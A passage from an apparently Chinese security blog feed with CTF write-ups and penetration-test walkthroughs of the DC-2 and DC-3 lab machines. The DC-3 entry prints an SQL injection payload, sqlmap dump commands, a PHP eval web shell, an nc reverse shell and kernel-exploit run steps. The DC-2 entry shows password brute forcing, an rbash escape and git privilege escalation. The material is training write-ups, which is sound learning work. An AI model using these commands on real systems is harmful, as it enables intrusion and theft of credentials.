$_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>接着我们试着访问hint.php获取到flag的文件名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>最后构造payload得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">http:&#x2F;&#x2F;97050581-1a0e-42b8-9071-67c1d68ca596.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/529846447.png"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3090789108.png"><br>根据提示我们先下载他的源码<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3205019552.png"><br>……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">http:&#x2F;&#x2F;3022174e-6037-4c4b-937d-3dc5f6ad60f9.node3.buuoj.cn&#x2F;index.php?select&#x3D;O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1459374351.png"></p><p>待续…</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>待续…</p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>待续…</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>待续…</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>待续…</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>待续…</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><p>待续…</p><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>待续…</p><h1 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h1><h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p>待续…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3靶机渗透测试报告</title>
      <link href="2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>蓝苟的黑盒测试之旅——DC3<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3785124930.png"></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>二话不说，先扫波内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3389956070.png"></p><p>接着nmap扫一下可以看到开放了80端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A 192.168.232.145</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/547341395.png"></p><p>于是我们打开其网页看见其cms是joomla，并提示我们只有一个flag且需获取root权限<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3098420025.png"></p><p>接着我们用dirb扫下目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.15.139&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1188796362.png"></p><p>最后我们在 <code>README.txt</code> 目录下发现joomla是3.7的<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/929214917.png"></p><h2 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><p>通过以上信息，我们搜索一下joomla3.7漏洞发现存在sql注入<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2144505493.png"></p><p>接着我们开始构造url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/826557285.png"><br>可以看到确实是存在漏洞滴</p><p>sqlmap查询一下数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.15.139&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2577563000.png"></p><p>再查一下表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.15.139&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent –D joomladb --tables -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3151258998.png"></p><p>然后再查一下列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.15.139&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3767735883.png"></p><p>最后查询账号得到一串hash加密的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.15.139&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; -C username,password --dump -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2551483727.png"></p><p>john解密得到密码为snoopy（不懂为啥我得不到&amp;cmd5也查不到.jpg<br>接着我们百度joomla3.7的默认后台得知为 <code>administrator</code> ；成功登进后台<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/754580446.png"></p><h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><p>在Templates中发现可以修改php的文件，于是乎我们写个php的一句话木马上去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;harvey&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1907898004.png"></p><p>通过蚁剑连接<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/582655106.png"></p><p>写个反弹shell上传（蚁剑是非持续连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.15.140 2333 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/990505965.png"></p><p>然后访问此网站开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2712140000.png"></p><p>然后我们使用searchsploit工具来查找Ubuntu 16.04的提权漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1096698954.png"></p><p>查看该漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt</span><br></pre></td></tr></table></figure><p>得到exp下载链接并下载，同时上传 <code>exploit.tar</code> 并解压运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">exp下载地址</span><br><span class="line">Exploit-DB Mirror: https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploitdb-bin-sploits&#x2F;raw&#x2F;master&#x2F;bin-sploits&#x2F;39772.zip</span><br><span class="line">这里我是直接本地下载然后通过蚁剑上传</span><br><span class="line">unzip 39772.zip</span><br><span class="line">cd 39772</span><br><span class="line">unzip 39772.zip</span><br><span class="line">cd 39772</span><br><span class="line">ls</span><br><span class="line">tar xvf exploit.tar</span><br><span class="line">ls</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">ls</span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4124551179.png"></p><p>不知道这里咋解决惹~蹲个大佬赐教.jpg</p><p>反正最后获取root权限后，在root目录下获取到flag</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF 2021</title>
      <link href="2021/03/14/2021VNCTF/"/>
      <url>2021/03/14/2021VNCTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>呜呜呜~wtcl</p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Check-In"><a href="#Check-In" class="headerlink" title="Check_In"></a>Check_In</h2><blockquote><p>Welcome to Vnctf2021<br>群号:717513199<br>注意:<br>比赛结束后，请总榜前十五，分榜前三的师傅们在2021 年03月15日中午12点前提交详细的解题思路到赛事邮箱：<a href="mailto:&#x31;&#50;&#x38;&#x37;&#x30;&#49;&#49;&#54;&#48;&#x32;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#109;">&#x31;&#50;&#x38;&#x37;&#x30;&#49;&#49;&#54;&#48;&#x32;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#109;</a><br>请提交wp的各位师傅备注自己的姓名和学校方便我们发放奖品。<br>FLAG:vnctf{Have_a_good_time!}</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><blockquote><p>通关游戏就有flag哦宝贝们</p></blockquote><p>手残党又来玩CTF游戏啦！那肯定先来改改他的js代码~<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/100289661.png"></p><p>因为那个参数是开局的参数，所以我们需要自杀一次<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/437729839.png"></p><p>esc重生后你就拥有了超多的回(香)旋(蕉)镖(皮)<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2399448244.png"></p><p>然后我们通关就能获取flag:flag{this_game_is_funny!}（这我竟然也会死了..</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2034255113.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-压缩包那些事儿</title>
      <link href="2021/03/12/CTF-%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"/>
      <url>2021/03/12/CTF-%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="1-ARCHPR"><a href="#1-ARCHPR" class="headerlink" title="1.ARCHPR"></a>1.ARCHPR</h2><blockquote><p>ARCHPR分为暴力、掩码、字典三个模块<br>1.暴力:选择密码范围,长度等,由软件组合生成密码进行爆破<br>2.掩码:知道密码中的一部分,只需按规则构造其余部分<br>3.字典:通常是多数用户常用的一些密码集合,导入字典文件用其中的密码进行爆破</p></blockquote><p><a href="https://pan.baidu.com/s/1pO01qBdRR8HdN_AW1NoDGQ"><strong>下载地址</strong></a><strong>（提取码：5bap）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1807440072.png" alt="img"></p><h2 id="2-Ziperello"><a href="#2-Ziperello" class="headerlink" title="2.Ziperello"></a>2.Ziperello</h2><blockquote><p>一般来说，这工具对8位及以下的数字密码的zip压缩包很nice！秒破！</p></blockquote><p><a href="https://pan.baidu.com/s/1WUPFIUa-8lIeI8JBVcy0CQ"><strong>下载地址</strong></a><strong>（提取码：pa1z）</strong><br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3590603565.png" alt="img"></p><h2 id="3-PackageCrack"><a href="#3-PackageCrack" class="headerlink" title="3.PackageCrack"></a>3.PackageCrack</h2><p><a href="https://pan.baidu.com/s/1n-p2AgdHmxqLYpr8-reafA"><strong>下载地址</strong></a><strong>（提取码：73r2）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/68727731.png" alt="img"></p><h2 id="4-binwalk-foremost"><a href="#4-binwalk-foremost" class="headerlink" title="4.binwalk/foremost"></a>4.binwalk/foremost</h2><p>这貌似没啥好说的了</p><blockquote><p>binwalk xxx<br>binwalk -e xxx</p><p>foremost xxx</p></blockquote><h2 id="5-伪加密-010-winhex"><a href="#5-伪加密-010-winhex" class="headerlink" title="5.伪加密-010/winhex"></a>5.伪加密-010/winhex</h2><blockquote><p>zip：09—&gt;00<br>rar：忘了.jpg</p></blockquote><p>PS：ZipCenOp去伪加密（俺反正是没用过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">项目地址</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;FantasqueX&#x2F;ZipCenOp</span><br><span class="line">解密命令</span><br><span class="line">java -jar ZipCenOp.jar r xxxx.zip</span><br><span class="line">加密命令</span><br><span class="line">java -jar ZipCenOp.jar e xxxx.zip</span><br></pre></td></tr></table></figure><h2 id="6-crc32碰撞"><a href="#6-crc32碰撞" class="headerlink" title="6.crc32碰撞"></a>6.crc32碰撞</h2><blockquote><p>CRC校验实用程序库 在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。<br>总之每个文件都有唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但通常只适用于较小文本文件。</p></blockquote><p><a href="https://pan.baidu.com/s/13jfZT5QOBZa1lgmtzk9ywg"><strong>下载地址</strong></a><strong>（提取码：1dwm）</strong></p><p>食用方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crc32.py reverse crc32</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4160273894.png" alt="img"><br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4038618222.png" alt="img"></p><p>待续…</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2靶机渗透测试报告</title>
      <link href="2021/03/09/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>2021/03/09/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="开启征程——DC2"><a href="#开启征程——DC2" class="headerlink" title="开启征程——DC2"></a><strong>开启征程——DC2</strong></h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1166668819.png"></p><p>老样子，先内网扫描一波</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2348014230.png"></p><p>接着nmap扫一下他的端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 -A -sV 192.168.232.142</span><br></pre></td></tr></table></figure><p>ssh默认端口不是22？竟给改成了7744<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3263565253.png"></p><p>打开网页发现会打不开，这时就需要设置hosts文件才能访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts</span><br><span class="line">#输入i进行修改</span><br><span class="line">192.168.232.142         dc-2</span><br><span class="line">#保存返回 输入:x                                                                                                                                           </span><br><span class="line">cat &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1464127190.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1425742630.png"></p><p>此时访问 <code>http://dc-2</code> 即可，打开发现是wp的<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1710624774.png"></p><p>发现flag1<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2085853415.png"></p><p>根据提示需要cewl，生成密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl -w passwords.txt http:&#x2F;&#x2F;dc-2</span><br><span class="line">cat passwords.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/524969615.png"></p><p>接着我们使用专门扫wp的wpscan扫描用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate u</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2931284701.png"></p><p>最后成功得到三个用户名：admin、tom、jerry，并创建user.txt将其放入<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1423596692.png"></p><p>然后我们就可以根据所得user和passwords的字典用wpscan进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --ignore-main-redirect --url 192.168.232.142 -U user.txt -P passwords.txt --force</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2652349826.png"></p><p>最后我们成功爆破出了账号密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SUCCESS] - jerry &#x2F; adipiscing                        [SUCCESS] - tom &#x2F; parturient</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/507783810.png"></p><p>到这里，我们便可以ssh连进去了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.232.142 -p 7744</span><br><span class="line">parturient</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/21278984.png"></p><p>进去后发现shell被限制了，于是我们需要绕过rbash，然后设置环境变量，最终成功cat到flag3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">cat flag3.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3885569980.png"></p><p>根据提示我们再切换成用户jerry的,在jerry用户下得到flag4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">adipiscing</span><br><span class="line"></span><br><span class="line">cd &#x2F;home&#x2F;jerry</span><br><span class="line">ls</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4079066750.png"></p><p>Go on - git outta here!!!!<br>我们接着git提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1732024288.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ls &#x2F;root</span><br><span class="line">cat &#x2F;root&#x2F;final-flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2030599542.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯2020</title>
      <link href="2021/03/07/2020%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>2021/03/07/2020%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我没参加上~ 题目是Y5neKO师傅给我的（PS：Y5neKO师傅拿了三等奖！TQL！）</p></blockquote><h2 id="BeCare4"><a href="#BeCare4" class="headerlink" title="BeCare4"></a>BeCare4</h2><p><a href="https://pan.baidu.com/s/1VID6noh4hMKJX8ijvvC_ew">附件</a>（提取码：d9my）</p><p>npmtxt(翻译)</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2647919597.png"></p><p><a href="https://yuanfux.github.io/zero-width-web/">零宽隐写</a>，得到压缩包密码：RealV1siBle<br>想更深入了解该隐写可查看<a href="http://www.ga1axy.top/index.php/archives/20/">Galaxy师傅的文章</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3240318834.png"></p><p>解压得到一张图片（看wp得知是silenteye隐写，第一次遇到.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1021854976.png"></p><p>直接默认密码得到flag：D0g3{1nV1sible_flag_Can_You_find?!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1822169658.png"></p><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p><a href="https://pan.baidu.com/s/1j1592RWMhdI7UNfWGum27g">附件</a>（提取码：pvix）</p><p>不难看出这里是crc爆破</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4154854781.png"></p><p>最后成功得到压缩包密码：!qQIdEa@#!z)</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/633481274.png"></p><p>解压得到readme.txt</p><blockquote><p>出门一笑莫心哀，浩荡襟怀到处开。<br>时事难从无过立，达官非自有生来。<br>风涛回首空三岛，尘壤从头数九垓。<br>休信儿童轻薄语，嗤他赵老送灯台。</p><p>力微任重久神疲，再竭衰庸定不支。<br>苟利国家生死以，岂因祸福避趋之。<br>谪居正是君恩厚，养拙刚于戍卒宜。<br>戏与山妻谈故事，试吟断送老头皮。</p></blockquote><p>这里好像文件有点问题，待续…</p><h2 id="王牌特工"><a href="#王牌特工" class="headerlink" title="王牌特工"></a>王牌特工</h2><p><a href="https://pan.baidu.com/s/1FuVfFNtdB9Rov5HCaXCobw">附件</a>（提取码：ai9d）</p><p>磁盘取证，file命令发现它是个磁盘ext3</p><p><img 